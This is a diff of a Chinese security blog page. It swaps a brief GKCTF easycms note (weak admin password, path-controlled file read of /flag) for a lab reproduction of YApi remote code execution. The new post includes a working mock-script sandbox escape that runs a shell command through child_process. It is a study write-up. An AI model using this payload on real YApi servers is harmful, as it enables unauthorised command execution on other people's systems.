@@ -147,7 +147,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/06/%E4%B8%80%E6%AC%A1CMS%E9%A2%98%E7%9B%AE%E7%9A%84%E6%B5%85%E6%83%B3/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/06/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -161,7 +161,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/10/06/%E4%B8%80%E6%AC%A1CMS%E9%A2%98%E7%9B%AE%E7%9A%84%E6%B5%85%E6%83%B3/" class="post-title-link" itemprop="url">未命名</a>
+            <a href="/2021/10/06/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/YApi%EF%BC%88RCE%EF%BC%89%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">未命名</a>
         </h2>
 
         <div class="post-meta">
@@ -172,7 +172,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-10-06 09:56:24 / 修改时间：09:55:38" itemprop="dateCreated datePublished" datetime="2021-10-06T09:56:24+08:00">2021-10-06</time>
+              <time title="创建时间：2021-10-06 10:13:26 / 修改时间：10:12:53" itemprop="dateCreated datePublished" datetime="2021-10-06T10:13:26+08:00">2021-10-06</time>
             </span>
 
           
@@ -186,11 +186,29 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="一次CMS题目的浅想"><a href="#一次CMS题目的浅想" class="headerlink" title="一次CMS题目的浅想"></a>一次CMS题目的浅想</h1><p>来源：[GKCTF 2021]easycms</p>
-<p>简单总结一下：弱口令进如后台之后（admin：12345）有一个“导出模板”的，填写信息之后，发现是url进行定向寻找资源（re头：/var/www/thml………）。（所以尝试的URL重写覆盖<SSRF>“/flag”）</p>
-<p>成功读入/flag</p>
-<p>进入后台之后，后渗透的姿势又增加了，除传马外，在下载功能上，如有路径可控的变量，还可执行以上操作</p>
+          <h1 id="YApi（RCE）复现"><a href="#YApi（RCE）复现" class="headerlink" title="YApi（RCE）复现"></a>YApi（RCE）复现</h1><p>来源：微信公众号(星期五实验室)</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&mid=2247484376&idx=1&sn=f5dc6fe510b6eb11d3c0d2e587b5f021&chksm=cecf79e0f9b8f0f6c9cd2d8e44edeee2212135493f6bc209947ec86a2723822a341021132413&mpshare=1&scene=23&srcid=07155BojIRfYLNMwkPXuyOql&sharer_sharetime=1626332811477&sharer_shareid=4f2ed20b8bd17e5da3b26b8f611904fc#rd">https://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&amp;mid=2247484376&amp;idx=1&amp;sn=f5dc6fe510b6eb11d3c0d2e587b5f021&amp;chksm=cecf79e0f9b8f0f6c9cd2d8e44edeee2212135493f6bc209947ec86a2723822a341021132413&amp;mpshare=1&amp;scene=23&amp;srcid=07155BojIRfYLNMwkPXuyOql&amp;sharer_sharetime=1626332811477&amp;sharer_shareid=4f2ed20b8bd17e5da3b26b8f611904fc#rd</a></p>
+<h2 id="搭建环境遇到坑。。。"><a href="#搭建环境遇到坑。。。" class="headerlink" title="搭建环境遇到坑。。。"></a>搭建环境遇到坑。。。</h2><p>1.node 版本 并不是网上的越新越好。。。。</p>
+<p>2，一定要配置可切换 node版本的软件（nvm）</p>
+<p>3.这是大坑！！！！nvm 安装 node某些版本时，有的没有 npm。直接暴毙！！我找的一个稳定的版本。（v12.13.0）</p>
+<p>4数据库不一定界面化（或者说可视化）主要是服务要打开   （如遇到打不开的情况，要删除2个文件。ps：路径是自己安装路径）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dyw_666666/article/details/83685797">https://blog.csdn.net/dyw_666666/article/details/83685797</a></p>
+<p>5，最后部署时，管理员邮箱最好改一改，我样本次数不多（4次），默认时只出现一次错误，改名后解决。</p>
+<h3 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h3><p>1.注册后登录</p>
+<p><img src="image/image.png"></p>
+<p>2,添加项目</p>
+<p><img src="image/image_1.png"></p>
+<p>3,打开全局mock脚本，并写入代码</p>
+<p><img src="image/6%607%5B%7BDN$%25_EW91U61YCF0XA.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="keyword">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="keyword">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+
+
+<p>4.添加接口</p>
+<p><img src="image/image_2.png"></p>
+<p>5.访问目标网页</p>
+<p><img src="image/image_3.png"></p>
+<h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2>
       
     </div>
 
